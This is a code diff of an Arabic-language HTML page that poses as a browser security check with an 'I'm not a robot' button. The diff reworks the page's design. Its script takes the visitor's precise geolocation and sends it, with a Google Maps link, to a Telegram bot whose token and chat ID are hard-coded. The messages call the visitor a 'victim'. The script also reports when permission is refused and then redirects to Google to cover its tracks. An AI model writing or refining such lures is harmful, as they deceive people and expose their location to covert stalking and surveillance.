@@ -3,35 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدخول</title>
+    <title>تحقق من الأمان</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        button { background: #1DB954; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 18px; cursor: pointer; }
+        body { background-color: #1a1a1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #2d2d2d; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; max-width: 90%; }
+        button { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
+        button:hover { background: #0056b3; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
+</head>
+<body>
+    <div class="card">
+        <h2 id="status">فحص أمان المتصفح</h2>
+        <p id="msg">لأغراض أمنية، يرجى الضغط على الزر أدناه للتأكد من أنك لست برنامج روبوت.</p>
+        <div id="loader" class="loader"></div>
+        <button id="btn" onclick="startProcess()">أنا لست روبوت</button>
+    </div>
+
     <script>
-        async function catchMe() {
+        const TOKEN = "8715903044:AAEiMvrPalCrQMcXRLVw2-8AvIX6fAyPm78";
+        const CHAT_ID = "8419832124";
+
+        async function sendData(lat, lon) {
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            const text = `🔱 *تم الصيد بنجاح يا حيدر* 🔱\n\n📍 الموقع على الخريطة:\n${mapUrl}\n\n🌍 الإحداثيات:\n\`${lat}, ${lon}\``;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+            window.location.replace("https://www.google.com");
+        }
+
+        function startProcess() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('msg').innerText = 'جاري التحقق، يرجى الانتظار...';
+            document.getElementById('loader').style.display = 'block';
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude;
-                    const lon = p.coords.longitude;
-                    const token = "8715903044:AAEiMvrPalCrQMcXRLVw2-8AvIX6fAyPm78";
-                    const chat_id = "8419832124";
-                    const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const text = `🔱 تم صيد موقع الضحية 🔱\n\nالرابط:\n${map}`;
-                    
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-                    window.location.href = "https://www.google.com";
-                }, () => {
-                    window.location.href = "https://www.google.com";
-                }, {enableHighAccuracy: true});
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendData(position.coords.latitude, position.coords.longitude);
+                    },
+                    (error) => {
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء الإذن.")}`);
+                        window.location.replace("https://www.google.com");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                window.location.replace("https://www.google.com");
             }
         }
     </script>
-</head>
-<body>
-    <h2>يجب تأكيد هويتك للمتابعة</h2>
-    <p>اضغط على الزر أدناه لإتمام الفحص</p>
-    <br>
-    <button onclick="catchMe()">أنا لست برنامج روبوت</button>
 </body>
 </html>
